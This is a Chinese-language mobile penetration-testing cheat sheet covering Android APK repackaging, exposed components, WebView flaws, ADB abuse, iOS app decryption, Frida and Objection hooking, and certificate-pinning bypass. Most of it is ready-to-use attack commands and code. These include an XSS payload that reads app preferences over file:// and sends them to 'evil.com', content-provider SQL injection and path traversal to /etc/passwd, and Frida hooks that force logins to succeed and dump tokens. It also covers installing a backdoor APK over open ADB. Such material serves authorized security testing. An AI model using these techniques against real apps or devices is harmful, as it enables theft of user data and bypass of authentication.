# 移动端安全测试实战参考

> 覆盖: Android APK反编译 → 组件暴露 → WebView漏洞 → ADB → iOS砸壳 → Frida → Objection → 证书固定绕过
> 定位: 与 SecSkills-main 互补，SecSkills 不覆盖移动端渗透

---

## 1. Android APK 反编译与重打包

### 1.1 工具链

```bash
# 必备工具
jadx-gui app.apk                # GUI 反编译，看 Java 源码
apktool d app.apk -o app_dir    # 解包 (smali + 资源)
apktool b app_dir -o new.apk    # 重打包
keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore new.apk debug
```

### 1.2 快速提取敏感信息

```bash
# 硬编码密钥/Token/URL
grep -r -i "api_key\|api_secret\|client_secret\|password\|token\|secret\|aes\|rsa" app_dir/sources/

# 检查 AndroidManifest.xml
cat app_dir/AndroidManifest.xml | grep -E "exported|permission|debuggable|backup"

# 提取所有 URL/域名
grep -rohP 'https?://[^"'"'"'<> ]+' app_dir/sources/ | sort -u

# 提取 Base64
grep -rohP '[A-Za-z0-9+/]{40,}={0,2}' app_dir/sources/ | sort -u

# Native 库中的字符串
strings app_dir/lib/armeabi-v7a/*.so | grep -i "key\|secret\|password\|token\|api"
```

### 1.3 修改 smali 重打包

```bash
# 1. 查找关键逻辑 (例如权限检查)
grep -r "isAdmin\|checkPermission\|root\|debug" app_dir/smali/

# 2. 修改 smali 条件跳转
# 找到 if-eqz (if equal zero) → 改为 if-nez (if not equal zero)
# 或 if-eqz v0, :cond_0 → goto :cond_0

# 3. 添加 Log 输出
# const-string v0, "PWNED"
# invoke-static {v0, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

# 4. 重打包+签名
apktool b app_dir -o patched.apk
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore patched.apk debug
```

---

## 2. Android 四大组件暴露

### 2.1 Activity 暴露

```bash
# 检测 AndroidManifest 中 exported=true 的 Activity
grep -A5 'activity.*exported="true"' app_dir/AndroidManifest.xml

# 启动暴露的 Activity
adb shell am start -n com.example.app/.SecretActivity
adb shell am start -n com.example.app/.AdminPanelActivity

# 带 extra 参数启动
adb shell am start -n com.example.app/.LoginActivity --es username admin --es password test

# 从浏览器启动 (Deep Link)
adb shell am start -a android.intent.action.VIEW -d "app://login?token=test"
```

### 2.2 Service 暴露

```bash
# 检测 exported=true 的 Service
grep -A5 'service.*exported="true"' app_dir/AndroidManifest.xml

# 启动 Service
adb shell am startservice -n com.example.app/.DataSyncService

# 绑定 Service
adb shell am bind -n com.example.app/.DataSyncService

# 向 Service 发送 Intent
adb shell am startservice -n com.example.app/.CommandService --es cmd exec --es arg "id"
```

### 2.3 Broadcast Receiver 暴露

```bash
# 检测 exported=true 的 Receiver
grep -A5 'receiver.*exported="true"' app_dir/AndroidManifest.xml

# 发送广播
adb shell am broadcast -a com.example.app.SECRET_ACTION
adb shell am broadcast -a com.example.app.UPDATE_CONFIG --es url "http://evil.com/payload"

# 有序广播拦截
adb shell am broadcast -a android.intent.action.BATTERY_LOW
```

### 2.4 Content Provider 暴露

```bash
# 检测 exported=true 的 Provider
grep -A5 'provider.*exported="true"' app_dir/AndroidManifest.xml

# 查询 Content URI
adb shell content query --uri content://com.example.app.provider/users
adb shell content query --uri content://com.example.app.provider/users/1
adb shell content query --uri content://com.example.app.provider/credentials

# SQL 注入
adb shell content query --uri content://com.example.app.provider/users --where "1=1"
adb shell content query --uri content://com.example.app.provider/users --where "name=' OR '1'='1"

# 目录遍历
adb shell content query --uri content://com.example.app.provider/../../../../etc/passwd
```

---

## 3. Android WebView 漏洞

### 3.1 JavaScript 桥接 (addJavascriptInterface)

```bash
# 检测: jadx 中搜索 addJavascriptInterface
grep -r "addJavascriptInterface" app_dir/sources/
grep -r "@JavascriptInterface" app_dir/sources/

# 利用 (Android < 4.2 或未设置 @JavascriptInterface)
# 在 WebView 中执行
webView.addJavascriptInterface(new Object() {
    @JavascriptInterface
    public String exec(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
        return "";
    }
}, "bridge");

# 攻击JS:
# <script>window.bridge.exec("id");</script>
```

### 3.2 File:// 协议访问

```bash
# 检测: WebView 是否启用了 file:// 协议
grep -r "setAllowFileAccess\|file://" app_dir/sources/

# 利用 (XSS + file://):
# <script>
# var xhr = new XMLHttpRequest();
# xhr.open("GET", "file:///data/data/com.example.app/shared_prefs/prefs.xml", false);
# xhr.send();
# fetch("http://evil.com/steal?d=" + btoa(xhr.responseText));
# </script>
```

### 3.3 WebView 域检查绕过

```bash
# 检测: shouldOverrideUrlLoading / shouldInterceptRequest
grep -r "shouldOverrideUrlLoading\|shouldInterceptRequest" app_dir/sources/

# 常见绕过:
# http://evil.com@legitimate.com
# http://legitimate.com.evil.com
# http://legitimate.com%40evil.com
# http://legitimate.com/..%2F..%2Fevil.com
```

---

## 4. ADB 调试接口利用

### 4.1 检测 ADB 开启

```bash
# 本地 ADB
adb devices -l

# 远程 ADB (TCP 5555)
nc -zv <target> 5555
adb connect <target>:5555

# 通过端口扫描
nmap -p 5555 <target>
```

### 4.2 ADB 高危操作

```bash
# Shell
adb shell
adb shell id
adb shell "cat /data/data/com.example.app/databases/*.db"

# 安装/卸载应用
adb install backdoor.apk
adb uninstall com.example.app

# 拉取数据
adb pull /data/data/com.example.app/
adb pull /sdcard/

# 推送文件
adb push payload.apk /data/local/tmp/

# 截屏/录屏
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png .
adb shell screenrecord /sdcard/demo.mp4
```

### 4.3 ADB 备份攻击

```bash
# 检测: android:allowBackup="true" (默认值)
grep "allowBackup" app_dir/AndroidManifest.xml

# 利用
adb backup -apk -noshared -all -f backup.ab
# 提取: dd if=backup.ab bs=1 skip=24 | openssl zlib -d > backup.tar
# 或使用 Android Backup Extractor
java -jar abe.jar unpack backup.ab backup.tar
tar -xvf backup.tar
```

---

## 5. iOS IPA 砸壳与分析

### 5.1 获取 IPA

```bash
# 从 App Store 下载加密 IPA (需要越狱设备或 Mac)
# 或从第三方源获取已砸壳 IPA

# 查看 IPA 结构
unzip -l app.ipa | head -30
# Payload/App.app/ 包含可执行文件和资源
```

### 5.2 砸壳 (需要越狱设备)

```bash
# 使用 dumpdecrypted (已安装越狱)
# 设备上: 找到 app 的可执行文件路径
ps -e | grep AppName
# /var/containers/Bundle/Application/<UUID>/AppName.app/AppName

# 砸壳
cycript -p AppName
# 在 cycript 中: @import com.saurik.dumpdecrypted

# 或使用 Clutch
Clutch -d com.example.app

# 或使用 frida-ios-dump
frida-ios-dump -u <DEVICE_IP> com.example.app -o app.ipa
```

### 5.3 iOS 二进制分析

```bash
# 检查二进制保护
otool -l AppName | grep -E "ENCRYPT|cryptid"
# cryptid 1 = 加密, 0 = 已砸壳

# 检查 PIE / ARC
otool -h AppName | grep PIE
nm AppName | grep objc_retain

# 提取 Objective-C 方法签名
class-dump -H AppName -o headers/
# 或
nm AppName | grep -E "\+\[|\-\[" | head -50

# 字符串提取
strings AppName | grep -i "key\|secret\|password\|token\|api"
strings AppName | grep -E 'https?://' | sort -u
```

---

## 6. Frida 动态注入

### 6.1 环境准备

```bash
# 安装
pip install frida-tools
# 推送 frida-server 到 Android 设备
adb push frida-server-<VERSION>-android-arm64 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server-*
adb shell /data/local/tmp/frida-server-* &

# iOS
# 需越狱设备，通过 Cydia 安装 frida
```

### 6.2 基础 Hook

```bash
# 列出进程
frida-ps -U          # USB 设备
frida-ps -R          # 远程

# 附加并执行 JS
frida -U com.example.app -l hook.js

# 免附加启动
frida -U -f com.example.app -l hook.js --no-pause
```

### 6.3 常用 Hook 脚本

```javascript
// hook.js — 函数参数/返回值 Hook
Java.perform(function() {
    // Hook 一个方法
    var TargetClass = Java.use('com.example.app.LoginActivity');
    TargetClass.checkPassword.implementation = function(password) {
        console.log('[+] Password entered: ' + password);
        var result = this.checkPassword(password);
        console.log('[+] Result: ' + result);
        return true;  // 强制返回 true 绕过认证
    };

    // Hook 构造函数
    TargetClass.$init.overload('java.lang.String').implementation = function(str) {
        console.log('[+] Constructor called with: ' + str);
        this.$init(str);
    };
});

// Hook 返回值和多重重载
Java.perform(function() {
    var Cls = Java.use('com.example.app.ApiService');
    Cls.getToken.overload().implementation = function() {
        console.log('[+] getToken() called');
        var token = this.getToken();
        console.log('[+] Token: ' + token);
        send({type: 'token', data: token});  // 发送到 Python 端
        return token;
    };
});

// SSL Pinning 绕过 (通用)
Java.perform(function() {
    var ssl = Java.use('javax.net.ssl.HttpsURLConnection');
    ssl.setDefaultHostnameVerifier.implementation = function(verifier) {
        return null;  // 不校验
    };
    var all = Java.use('javax.net.ssl.SSLContext');
    all.init.implementation = function(km, tm, sr) {
        console.log('[+] SSL Context init bypassed');
    };
});
```

### 6.4 命令行快速 Hook

```bash
# 运行时枚举类
frida -U com.example.app -e 'Java.perform(function() { Java.enumerateLoadedClasses({onMatch: function(c){console.log(c)}, onComplete:function(){}}); })'

# 调用静态方法
frida -U com.example.app -e 'Java.perform(function(){ var Cls = Java.use("com.example.app.Utils"); console.log(Cls.getSecretKey()); })'

# Hook 所有方法
frida -U com.example.app -e 'Java.perform(function(){ Java.enumerateLoadedClasses({onMatch:function(c){if(c.includes("com.example")){try{Java.use(c).$new.overloads.forEach(function(o){o.implementation=function(){console.log("new "+c);return this.$new.apply(this,arguments)}})}catch(e){}}},onComplete:function(){}})})'
```

---

## 7. Objection 运行时操作

### 7.1 基础命令

```bash
# 启动
objection -g com.example.app explore

# 内存中搜索类/方法
android hooking list classes
android hooking search classes com.example.app
android hooking list class_methods com.example.app.LoginActivity

# Hook 方法
android hooking watch class_method com.example.app.ApiService.getToken --dump-args --dump-return

# 禁用 SSL Pinning
android sslpinning disable
ios sslpinning disable

# 查看 SQLite 数据库
android database list
android database execute <DB_PATH> "SELECT * FROM users"

# 查看 SharedPreferences
android keystore list
android preferences get

# 屏幕截图
android ui screenshot /sdcard/screen.png
```

### 7.2 免 Root 注入 (Frida Gadget)

```bash
# 1. 下载 frida-gadget
# 2. 解压 APK
apktool d app.apk -o app_dir

# 3. 将 frida-gadget.so 放入 lib 目录
cp frida-gadget-<ARCH>.so app_dir/lib/<ARCH>/libfrida-gadget.so

# 4. 修改 smali 加载 gadget (注入到主 Activity)
# 在 Application.onCreate 或 MainActivity.onCreate 中添加:
# System.loadLibrary("frida-gadget");

# 5. 重打包+签名
apktool b app_dir -o patched.apk
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore patched.apk debug

# 6. 运行后自动暴露端口 27042，连接:
frida -H 127.0.0.1:27042
```

---

## 8. 证书固定绕过

### 8.1 全局绕过 (Android 7+)

```bash
# 方法1: 安装用户证书到系统信任存储 (需 Root)
adb push burp.crt /sdcard/
adb shell
su
cp /sdcard/burp.crt /system/etc/security/cacerts/
chmod 644 /system/etc/security/cacerts/burp.crt
reboot

# 方法2: 使用 VirtualXposed (免 Root)
# 在 VirtualXposed 中安装应用 + 证书管理模块

# 方法3: 内核模块绕过
# adb shell
# echo 1 > /sys/kernel/security/selinux/disable

# 方法4: Magisk 模块
# 安装 "Move Certificates" 或 "Magisk Trust User Certs"
```

### 8.2 Objection 绕过

```bash
# 最简方法
objection -g com.example.app explore
android sslpinning disable

# 或使用 Frida 脚本
frida -U -f com.example.app -l ssl-bypass.js --no-pause
```

### 8.3 iOS 证书固定绕过

```bash
# 越狱设备: 安装 SSL Kill Switch 2
# Cydia → 搜索安装

# Frida 绕过 (iOS)
frida -U com.example.app -l ios-ssl-bypass.js
```

---

## 速查表

| 场景 | 工具/命令 | 目的 |
|------|----------|------|
| 反编译 APK | `jadx-gui app.apk` | 看 Java 源码 |
| 解包 APK | `apktool d app.apk -o dir` | 获取 smali/资源 |
| 重打包 | `apktool b dir -o new.apk` | 修改后打包 |
| 组件暴露 | `adb shell am start -n ...` | 启动暴露组件 |
| Content Provider | `adb shell content query --uri ...` | 查询数据 |
| ADB Shell | `adb shell` | 远程 Shell |
| Frida Hook | `frida -U app -l hook.js` | 动态注入 |
| Objection | `objection -g app explore` | 运行时操作 |
| SSL 绕过 | `android sslpinning disable` | 证书固定绕过 |
| 无 Root 注入 | Frida Gadget 重打包 | 无需 Root 动态分析 |

---

*参考: frida.re, objection.dev, portswigger.net/mobile | 免 Root 注入需重打包 APK*
